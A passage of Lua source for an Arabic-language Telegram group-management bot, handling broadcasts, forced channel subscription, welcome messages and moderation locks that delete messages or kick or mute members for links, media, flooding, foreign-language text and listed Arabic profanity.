send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من المطورين*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end

end
--------------------------------------------------------------------------------------------------------------
if text and not Special(msg) then  
local RiNdA1_Msg = database:get(bot_id.."RiNdA1:Add:Filter:Rp2"..text..msg.chat_id_)   
if RiNdA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ ﭑݪعضوٍَ >* ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n ⊀︰ '..RiNdA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
end
if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ⊀︰ .' then   
send(msg.chat_id_, msg.id_," ⊀︰ تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " ⊀︰ تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ⊀︰ .' then   
send(msg.chat_id_, msg.id_," ⊀︰ تم الغاء الاذاعه للخاص")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'User_Bot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ⊀︰ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ⊀︰ .' then   
send(msg.chat_id_, msg.id_," ⊀︰ تم الغاء الاذاعه")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Chek:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ⊀︰ تمت الاذاعه الى >>{"..#list.."} كروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ⊀︰ .' then   
send(msg.chat_id_, msg.id_," ⊀︰ تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'Chek:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ⊀︰ تمت الاذاعه الى >>{"..#list.."} كروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ⊀︰ .' then   
send(msg.chat_id_, msg.id_," ⊀︰ تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'User_Bot')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ⊀︰ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " ⊀︰ تم الغاء الامر ")
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, ' ⊀︰ المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' ⊀︰ عذا لا يمكنك خلي معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' ⊀︰ عذا لا يمكنك خلي معرف كروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' ⊀︰ البوت ادمن في القناة \n ⊀︰ تم تفعيل الاشتراك الاجباري في \n ⊀︰ ايدي القناة ('..data.id_..')\n ⊀︰ معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' ⊀︰ عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
end
if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " ⊀︰ تم الغاء الامر ")
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
database:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,' ⊀︰ تم تغيير رسالة الاشتراك ')
end

local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n⊀︰  نورت حبي \n⊀︰   name \n⊀︰  user' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,'['..t..']')
end,nil) 
end 
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,' ⊀︰ عذرآ البوت ليس ادمن بالقناه ')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,' ⊀︰ … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' ⊀︰ تـم بـرو تغيـرت صـوره كـروبك')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"* ⊀︰ تم الغاء خلي الوصف*")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم بࢪو. تغير وصـف كروبـك*')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"* ⊀︰ تم الغاء حفـض ترحيـب بـرو..🕸️*")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم حفـض التـرحيب..🕸️*')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_,"* ⊀︰ تم الغاء حفظ الرابط..🕸️*")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"* ⊀︰ تم حفـض رابـط بـرو..🕸️*")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if RiNdA_Msg and not Special(msg) then  
local RiNdA_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if RiNdA_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⊀︰ ﭑݪعضوَ : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⊀︰ ["..RiNdA_Msg.."] \n")
else
send(msg.chat_id_,0," ⊀︰ الـعضو {["..data.first_name_.."](T.ME/SourcE_RiNdA)}\n ⊀︰ ["..RiNdA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
--------------------------------------------------------------------------------------------------------------
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
database:setex(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن", "خالی بند","عزیزم خوبی","سلامت باشی","میخوام","سلام","خوببی","ميدم","کی اومدی","خوابیدین"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Engilsh'..msg.chat_id_) and not Special(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then   
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
chat_kick(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
chat_kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Special(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Special(msg) then
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Special(msg) then     
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
